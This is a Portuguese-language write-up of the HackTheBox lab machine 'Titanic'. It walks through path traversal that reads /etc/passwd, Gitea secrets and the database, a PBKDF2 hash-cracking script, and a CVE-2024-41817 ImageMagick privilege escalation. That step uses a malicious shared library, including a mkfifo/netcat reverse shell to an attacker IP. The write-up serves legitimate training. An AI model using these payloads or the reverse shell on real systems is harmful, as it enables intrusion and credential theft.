---
title: Titanic HTB Write-up
created: 2025-06-28 22:57
tags:
  - hackthebox
  - ctf
  - pathtraversal
  - gitea
  - imagemagick
draft: false
---

# Subtítulo da horinha

![[Titanic.png| A imagem mostra um navio e abaixo vemos o nome da máquina: Titanic.]]

## Introdução

Olá mundo! Sejam todos bem vindos à mais uma aventura em minha jornada pelo mundo da cibersegurança. Hoje vamos falar sobre `Titanic`, uma máquina de dificuldade classificada como fácil no [Hackthebox](https://www.hackthebox.com).

Em `Titanic`, temos um site onde podemos fazer reserva para viajar no navio de mesmo nome, que é vulnerável à `Path Traversal`. Também temos um subdomínio com um repositório `gitea`, onde juntando à vulnerabilidade do site, podemos enumerar e conseguir credenciais válidas para conectar remotamente ao servidor via [[SSH]]. Para escalada de privilégios, nos aproveitamos de uma falha no programa `imagemagick`, cuja versão é vulnerável à `CVE-2024-41817 Arbitrary Code Execution`.

Isso soa bem interessante, então vamos começar!

---

## Reconhecimento

### Nmap

O resultado do programa [[NMAP]] mostrou que havia apenas duas portas abertas.

```bash
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.52
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Did not follow redirect to http://titanic.htb/
Service Info: Host: titanic.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Feb 25 20:54:03 2025 -- 1 IP address (1 host up) scanned in 17.00 seconds
```

### Web

A porta aberta **80** indicava um website. Também havia um redirecionamento para `titanic.htb`, por isso adicionei o endereço ao meu arquivo `/etc/hosts`. Ao visitar o site, me deparei com um site de reservas para viajar no Titanic.

![[tit-0.png | A imagem mostra a home page do site. Nela vemos várias imagens do navio Titanic.]]

O site não possui muita interação, por isso acabei por ir diretamente à função de fazer a reserva.

![[tit-1.png | A imagem mostra o formulário a ser preenchido para a reserva da viagem.]]

Depois de preencher todo o formulário, pude fazer o download da minha reserva em um arquivo `json`. 

```bash
┌──(kali㉿kali)-[~/Boxes/Hackthebox/Easy/Titanic]
└─$ cat 14767da6-a690-4789-8ff4-fb11bc991068.json | jq
{
  "name": "preacher",
  "email": "preacher@root.htb",
  "phone": "55 555 555 55",
  "date": "2025-02-27",
  "cabin": "Deluxe"
}
```

Mas o interessante é que o site aponta para `titanic.htb/download?ticket=<arquivo.json>` ao fazer o download. Isso me deu a idéia de testar se era vulnerável à `Path Traversal`. Usando a ferramenta `Curl`, pude confirmar a vulnerabilidade.

```bash {35}
┌──(kali㉿kali)-[~/Boxes/Hackthebox/Easy/Titanic]
└─$ curl http://titanic.htb/download?ticket=../../../../../../../../etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin 
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:104::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:104:105:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
pollinate:x:105:1::/var/cache/pollinate:/bin/false
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
syslog:x:107:113::/home/syslog:/usr/sbin/nologin
uuidd:x:108:114::/run/uuidd:/usr/sbin/nologin
tcpdump:x:109:115::/nonexistent:/usr/sbin/nologin
tss:x:110:116:TPM software stack,,,:/var/lib/tpm:/bin/false
landscape:x:111:117::/var/lib/landscape:/usr/sbin/nologin
fwupd-refresh:x:112:118:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
usbmux:x:113:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
developer:x:1000:1000:developer:/home/developer:/bin/bash
lxd:x:999:100::/var/snap/lxd/common/lxd:/bin/false
dnsmasq:x:114:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
_laurel:x:998:998::/var/log/laurel:/bin/false
```

Além de confirmar o `Path Traversal`, também descobri um usuário válido com uma `/home` no servidor: `developer`.

### Gitea

Enquanto fazia esses testes manualmente, eu havia deixado a ferramenta `Ffuf` rodando em outro painel do `Tmux`. Ao verificar o resultado da varredura de subdomínios, havia encontrado um repositório gitea em `dev.titanic.htb`.

```bash {25}
┌──(kali㉿kali)-[~/Boxes/Hackthebox/Easy/Titanic]
└─$ ffuf -w /opt/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://titanic.htb -H "Host: FUZZ.titanic.htb" -ac

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________ 

 :: Method           : GET
 :: URL              : http://titanic.htb
 :: Wordlist         : FUZZ: /opt/seclists/Discovery/DNS/subdomains-top1million-5000.txt
 :: Header           : Host: FUZZ.titanic.htb
 :: Follow redirects : false
 :: Calibration      : true
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

dev                     [Status: 200, Size: 13982, Words: 1107, Lines: 276, Duration: 295ms]
:: Progress: [4989/4989] :: Job [1/1] :: 169 req/sec :: Duration: [0:00:31] :: Errors: 0 ::
```

Adicionei o endereço `dev.titanic.htb` ao meu arquivo `/etc/hosts`  visitei a página.

![[tit-2.png | A imagem mostra a home page de um repositósio Gitea.]]

Era um repositório `Gitea`, onde encontrei novas referências ao usuário `developer`. Em seu repositório, havia um arquivo de configuração do `Docker`, que indicava o caminho de inicialização do  `app.py`, aplicação de reservas do site `Titanic.htb`.

O container era iniciado em `/home/developer/gitea/data` e isso acabou sendo confuso ao tentar encontrar o banco de dados. Porém, depois de ler a documentação do `Gitea` para docker, descobri que o arquivo de configuração estaria em `/home/developer/gitea/data/gitea/conf/app.ini`. Usando o `Path Traversal` consegui ler o conteúdo do arquivo.

```bash {31}
┌──(kali㉿kali)-[~/Boxes/Hackthebox/Easy/Titanic]
└─$ curl http://titanic.htb/download?ticket=../../../../../../../../home/developer/gitea/data/gitea/conf/app.ini
APP_NAME = Gitea: Git with a cup of tea
RUN_MODE = prod
RUN_USER = git
WORK_PATH = /data/gitea 

[repository]
ROOT = /data/git/repositories

[repository.local]
LOCAL_COPY_PATH = /data/gitea/tmp/local-repo

[repository.upload]
TEMP_PATH = /data/gitea/uploads

[server]
APP_DATA_PATH = /data/gitea
DOMAIN = gitea.titanic.htb
SSH_DOMAIN = gitea.titanic.htb
HTTP_PORT = 3000
ROOT_URL = http://gitea.titanic.htb/
DISABLE_SSH = false
SSH_PORT = 22
SSH_LISTEN_PORT = 22
LFS_START_SERVER = true
LFS_JWT_SECRET = OqnUg-uJVK-l7rMN1oaR6oTF348gyr0QtkJt-JpjSO4
OFFLINE_MODE = true

[database]
PATH = /data/gitea/gitea.db
DB_TYPE = sqlite3
HOST = localhost:3306
NAME = gitea
USER = root
PASSWD =
LOG_SQL = false
SCHEMA =
SSL_MODE = disable

[indexer]
ISSUE_INDEXER_PATH = /data/gitea/indexers/issues.bleve

[session]
PROVIDER_CONFIG = /data/gitea/sessions
PROVIDER = file

[picture]
AVATAR_UPLOAD_PATH = /data/gitea/avatars
REPOSITORY_AVATAR_UPLOAD_PATH = /data/gitea/repo-avatars

[attachment]
PATH = /data/gitea/attachments

[log]
MODE = console
LEVEL = info
ROOT_PATH = /data/gitea/log

[security]
INSTALL_LOCK = true
SECRET_KEY =
REVERSE_PROXY_LIMIT = 1
REVERSE_PROXY_TRUSTED_PROXIES = *
INTERNAL_TOKEN = eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYmYiOjE3MjI1OTUzMzR9.X4rYDGhkWTZKFfnjgES5r2rFRpu_GXTdQ65456XC0X8
PASSWORD_HASH_ALGO = pbkdf2

[service]
DISABLE_REGISTRATION = false
REQUIRE_SIGNIN_VIEW = false
REGISTER_EMAIL_CONFIRM = false
ENABLE_NOTIFY_MAIL = false
ALLOW_ONLY_EXTERNAL_REGISTRATION = false
ENABLE_CAPTCHA = false
DEFAULT_KEEP_EMAIL_PRIVATE = false
DEFAULT_ALLOW_CREATE_ORGANIZATION = true
DEFAULT_ENABLE_TIMETRACKING = true
NO_REPLY_ADDRESS = noreply.localhost

[lfs]
PATH = /data/git/lfs

[mailer]
ENABLED = false

[openid]
ENABLE_OPENID_SIGNIN = true
ENABLE_OPENID_SIGNUP = true

[cron.update_checker]
ENABLED = false

[repository.pull-request]
DEFAULT_MERGE_STYLE = merge

[repository.signing]
DEFAULT_TRUST_MODEL = committer

[oauth2]
JWT_SECRET = FIAOKLQX4SBzvZ9eZnHYLTCiVGoBtkE4y5B7vMjzz3g
```

O arquivo de configuração mostrou que o banco de dados estava em `/data/gitea/gitea.db`. Usando a mesma técnica, baixei o banco de dados para minha máquina.

```bash
┌──(kali㉿kali)-[~/Boxes/Hackthebox/Easy/Titanic]
└─$ curl http://titanic.htb/download?ticket=../../../../../../../../home/developer/gitea/data/gitea/gitea.db -o gitea.db
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100 2036k  100 2036k    0     0   481k      0  0:00:04  0:00:04 --:--:--  510k

┌──(kali㉿kali)-[~/Boxes/Hackthebox/Easy/Titanic]
└─$ ls
823c1d67-303c-41d1-98b4-cd563b1b5a2f.json  gitea.db  images  log-Titanic.txt  misc-Titanic.md  nmap
```

---

## Acesso Inicial

### Pbkdf2 Hash

Usando o `Sqlite3`, consegui encontrar a hash do usuário `developer`.

```bash {63}
┌──(kali㉿kali)-[~/Boxes/Hackthebox/Easy/Titanic]
└─$ sqlite3 gitea.db
SQLite version 3.46.1 2024-08-13 09:16:08
Enter ".help" for usage hints.
sqlite> .tables 
access                     oauth2_grant
access_token               org_user
action                     package
action_artifact            package_blob
action_run                 package_blob_upload
action_run_index           package_cleanup_rule
action_run_job             package_file
action_runner              package_property
action_runner_token        package_version
action_schedule            project
action_schedule_spec       project_board
action_task                project_issue
action_task_output         protected_branch
action_task_step           protected_tag
action_tasks_version       public_key
action_variable            pull_auto_merge
app_state                  pull_request
attachment                 push_mirror
auth_token                 reaction
badge                      release
branch                     renamed_branch
collaboration              repo_archiver
comment                    repo_indexer_status
commit_status              repo_redirect
commit_status_index        repo_topic
commit_status_summary      repo_transfer
dbfs_data                  repo_unit
dbfs_meta                  repository
deploy_key                 review
email_address              review_state
email_hash                 secret
external_login_user        session
follow                     star
gpg_key                    stopwatch
gpg_key_import             system_setting
hook_task                  task
issue                      team
issue_assignees            team_invite
issue_content_history      team_repo
issue_dependency           team_unit
issue_index                team_user
issue_label                topic
issue_user                 tracked_time
issue_watch                two_factor
label                      upload
language_stat              user
lfs_lock                   user_badge
lfs_meta_object            user_blocking
login_source               user_open_id
milestone                  user_redirect
mirror                     user_setting
notice                     version
notification               watch
oauth2_application         webauthn_credential
oauth2_authorization_code  webhook
sqlite> select * from user;
1|administrator|administrator||root@titanic.htb|0|enabled|cba20ccf927d3ad0567b68161732d3fbca098ce886bbc923b4062a3960d459c08d2dfc063b2406ac9207c980c47c5d017136|pbkdf2$50000$50|0|0|0||0|||70a5bd0c1a5d23caa49030172cdcabdc|2d149e5fbd1b20cf31db3e3c6a28fc9b|en-US||1722595379|1722597477|1722597477|0|-1|1|1|0|0|0|1|0|2e1e70639ac6b0eecbdab4a3d19e0f44|root@titanic.htb|0|0|0|0|0|0|0|0|0||gitea-auto|0
2|developer|developer||developer@titanic.htb|0|enabled|e531d398946137baea70ed6a680a54385ecff131309c0bd8f225f284406b7cbc8efc5dbef30bf1682619263444ea594cfb56|pbkdf2$50000$50|0|0|0||0|||0ce6f07fc9b557bc070fa7bef76a0d15|8bf3e3452b78544f8bee9400d6936d34|en-US||1722595646|1722603397|1722603397|0|-1|1|0|0|0|0|1|0|e2d95b7e207e432f62f3508be406c11b|developer@titanic.htb|0|0|0|0|2|0|0|0|0||gitea-auto|0
3|developer1|developer1||test@gmail.com|0|enabled|148f8613c3a3b585699b6e30218df5b41c2cbf2df5f12d7aeb5ed68cd11b5af3857d8f300a43ce1b44726dbc86863066a4ac|pbkdf2$50000$50|0|0|0||0|||476b20ef9041485398c8029ec042b0e4|3624df9c51bf116370eb463b25de9120|en-US||1740545696|1740545697|1740545696|0|-1|1|0|0|0|0|1|0|1aedb8d9dc4751e229a335e371db8058|test@gmail.com|0|0|0|0|0|0|0|0|0||gitea-auto|0
```

Ao tentar quebrar a senha com `John The Ripper`, percebi que o formato não era compatível. Ao ler o arquivo de configuração novamente, descobri que era o formato `pbkdf2`. Eu já tinha usado um script `Python` para quebrar esse formato na máquina `Compiled`. Então usei o mesmo script com pequenas modificações para descobrir a senha.

```bash {7,8}
import hashlib
import binascii
from pwn import log


# Parameters from gitea.db
salt  = binascii.unhexlify('8bf3e3452b78544f8bee9400d6936d34')  # 16 bytes
key   = 'e531d398946137baea70ed6a680a54385ecff131309c0bd8f225f284406b7cbc8efc5dbef30bf1682619263444ea594cfb56' 
dklen = 50
iterations = 50000 


def hash(password, salt, iterations, dklen):
    hashValue = hashlib.pbkdf2_hmac(
        hash_name='sha256', 
        password=password, 
        salt=salt, 
        iterations=iterations, 
        dklen=dklen,
        )
    return hashValue


# Crack
dict = '/usr/share/wordlists/rockyou.txt'
bar  = log.progress('Cracking PBKDF2')

with open(dict, 'r', encoding='utf-8') as f:
    for line in f:
        password  = line.strip().encode('utf-8') 
        hashValue = hash(password, salt, iterations, dklen)
        target    = binascii.unhexlify(key)
        # log.info(f'Our target is: {target}')
        bar.status(f'Trying: {password}, hash: {hashValue}')
        if hashValue == target:
            bar.success(f'Found password: {password}!')
            break
        
    bar.failure('Hash is not crackable.')
```

Usando o script, consegui a senha `25282528`.

```bash
┌──(kali㉿kali)-[~/Boxes/Hackthebox/Easy/Titanic]
└─$ python3 crackhash.py
\t\xCracking PBKDF2: Trying: b'july23', hash: b'\xd7.\xaa\xeb\x9dmw\x1c\x8cP(5\x0c\r\xdc\x03\xca\xca\xf71\xb9\x7f<N.m\xdaE\\\xc7\x98\x86\xe7\xf4`\xa8\x91\r\xfc\x18/N\x[d] Cracking PBKDF2: Trying: b'july15', hash: b'L\xd7\x04\r\x05\xaf\x89\x18P\xa5\x05\xfa\xdb\rY\xaa\x02\xdfd\xfb\xc6\x15\xd2\xca\xcd\x08\n\xf7\xbc\xd7_[\x8c\x16\xc3\x9[q] Cracking PBKDF2: Trying: b'emogurl', hash: b']\x11\xa1\'\xc3L]"\xee\xa4f\x0f\xe9-{\'\xba\xefv\x88\xac\x1a(n\x8d\x0b\xc9n\xfc\xb9l.\x16\x9c"/\xe7*98\xeb\xd3\xd3\xcb[p] Cracking PBKDF2: Trying: b'callalily', hash: b'!\xa6@\x96c\xc7]\x02b\xf6!\xca\xdd\x98\xde\x04W\xbf\xd1\xd3\xbc\x13\xed\xd3\xf2p\xa5\xadc\x84\xb5\x8a\xda"\xdc\x12h3[b] Cracking PBKDF2: Trying: b'baby21', hash: b'\xe9\xe3WU\xda\xad]\x9d\x1e8\x9a\x0f\xfa\x94\xeapc\x83=<\xfde\xe5\xeb\x95\xb8l\x99\xce\xc31\x82\xc8\xe4.\xa0B<\xa9Z\x82[q] Cracking PBKDF2: Trying: b'25282528', hash: b'\xe51\xd3\x98\x94a7\xba\xeap\xedjh\nT8^\xcf\xf110\x9c\x0b\xd8\xf2%\xf2\x84@k|\xbc\x8e\xfc]\xbe\xf3\x0b\xf1h&\x19&4D\x[+] Cracking PBKDF2: Found password: b'25282528'!
```

### Shell como developer

Com as credenciais `developer : 25282528`, obtive acesso via `SSH`. Aproveitei também para ler a flag do usuário.

```bash
┌──(kali㉿kali)-[~/Boxes/Hackthebox/Easy/Titanic]
└─$ ssh developer@titanic.htb
developer@titanic.htb's password:
Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-131-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Wed Feb 26 06:00:49 AM UTC 2025

  System load:           0.9
  Usage of /:            83.2% of 6.79GB
  Memory usage:          17%
  Swap usage:            0%
  Processes:             229
  Users logged in:       0
  IPv4 address for eth0: 10.10.11.55
  IPv6 address for eth0: dead:beef::250:56ff:fe94:4f78


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

developer@titanic:~$
developer@titanic:~$ ll
total 40
drwxr-x--- 7 developer developer 4096 Feb  3 17:09 ./
drwxr-xr-x 3 root      root      4096 Aug  1  2024 ../
lrwxrwxrwx 1 root      root         9 Jan 29 12:27 .bash_history -> /dev/null
-rw-r--r-- 1 developer developer 3771 Jan  6  2022 .bashrc
drwx------ 3 developer developer 4096 Aug  1  2024 .cache/
drwxrwxr-x 3 developer developer 4096 Aug  2  2024 gitea/
drwxrwxr-x 5 developer developer 4096 Aug  1  2024 .local/
drwxrwxr-x 2 developer developer 4096 Aug  2  2024 mysql/
-rw-r--r-- 1 developer developer  807 Jan  6  2022 .profile
drwx------ 2 developer developer 4096 Aug  1  2024 .ssh/
-rw-r----- 1 root      developer   33 Feb 26 04:04 user.txt
developer@titanic:~$ cat user.txt
016062c5f205f3df14359db5f1c6f2e3
```

---

## Escalação de Privilégios

Depois de vasculhar bastante pelos arquivos do servidor, encontrei um script interessante no diretório `/opt/scripts`.

```bash title="identify_images.sh"
cd /opt/app/static/assets/images
truncate -s 0 metadata.log
find /opt/app/static/assets/images/ -type f -name "*.jpg" | xargs /usr/bin/magick identify >> metadata.log
```

O script faz uma busca recursiva por todos os arquivos `.jpg` do diretório, repassa o resultado para o programa `ImageMagick`  que vai descrever algumas informações sobre cada arquivo e salvar no arquivo `metadata.log`. O arquivo `metadata.log` vai aumentando a cada minuto o que significa que o script roda via `cronjob`. O arquivo também tem o usuário `root` como seu proprietário.

Até aí parece inofensivo, porém ao verificar a versão do `ImageMagick` e pesquisar sobre alguma vulnerabilidade, encontrei um vetor para escalada de privilégios.

```bash
developer@titanic:/$ magick --version
Version: ImageMagick 7.1.1-35 Q16-HDRI x86_64 1bfce2a62:20240713 https://imagemagick.org
Copyright: (C) 1999 ImageMagick Studio LLC
License: https://imagemagick.org/script/license.php
Features: Cipher DPC HDRI OpenMP(4.5)
Delegates (built-in): bzlib djvu fontconfig freetype heic jbig jng jp2 jpeg lcms lqr lzma openexr png raqm tiff webp x xml zlib
Compiler: gcc (9.4)
```

A versão 7.1.1-35 do `ImageMagick` é vulnerável à `CVE-2024-41817-Arbitrary Code Execution` .

> [!info] **CVE-2024-41817-Arbitrary Code Execution**
> ImageMagick é um conjunto de software livre e de código aberto, usado para editar e manipular imagens digitais. A versão `AppImage` do `ImageMagick` pode usar um caminho vazio ao definir as variáveis de ambiente `MAGICK_CONFIGURE_PATH` e `LD_LIBRARY_PATH` durante a execução, o que pode levar à execução arbitrária de código ao carregar arquivos de configuração ou bibliotecas compartilhadas maliciosas no diretório de trabalho atual durante a execução do `ImageMagick`.

Seguindo as instruções dessa [POC](https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-8rxc-922v-phg8), consegui ler a flag do usuário `root` após o script rodar novamente.

```bash {12}
developer@titanic:/opt/app/static/assets/images$ gcc -x c -shared -fPIC -o ./libxcb.so.1 - << EOF
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor)) void init(){
    system("cat /root/root.txt > /tmp/preacher.txt");
    exit(0);
}
EOF
developer@titanic:/opt/app/static/assets/images$ cat /tmp/preacher.txt
c0319f9ea87c7398cd1820a1c1590dcc 
```

Será que dá para conseguir um shell reverso? É claro que sim!!

```bash {22,23,29}
# server side
developer@titanic:/opt/app/static/assets/images$ gcc -x c -shared -fPIC -o ./libxcb.so.1 - << EOF
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor)) void init(){
    system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.14.6 9001 >/tmp/f");
    exit(0);
}
EOF
developer@titanic:/opt/app/static/assets/images$ 

# kali machine
┌──(kali㉿kali)-[~/Boxes/Hackthebox/Easy/Titanic]
└─$ nc -lvnp 9001
listening on [any] 9001 ...
connect to [10.10.14.6] from (UNKNOWN) [10.10.11.55] 43488
bash: cannot set terminal process group (740739): Inappropriate ioctl for device
bash: no job control in this shell
root@titanic:/opt/app/static/assets/images# id
id
uid=0(root) gid=0(root) groups=0(root)
root@titanic:/opt/app/static/assets/images# whoami
whoami
root
root@titanic:/opt/app/static/assets/images# cat /root/root.txt
cat /root/root.txt
c0319f9ea87c7398cd1820a1c1590dcc 
```

## Conclusão

![[TitanicFinal.png| Mesma imagem do início, porém agora está escrito: Titanic has been Pwned]]

Essa foi uma máquina bem divertida e desafiadora. Levou um tempo para conseguir encontrar o caminho do banco de dados do `Gitea`, mas depois disso as coisas fluíram melhor. E foi bem legal aprender sobre a vulnerabilidade no `ImageMagick`.

```mermaid
flowchart TD
	subgraph acesso inicial
    A(Gitea Database) -->|Path Traversal| B(pbkdf2 hash) 
    end
    subgraph escalação de privilegios
    B -->|pbkdf2 crack| C(developer user)
    C -->|CVE-2024-41817| D(root)
    end
```

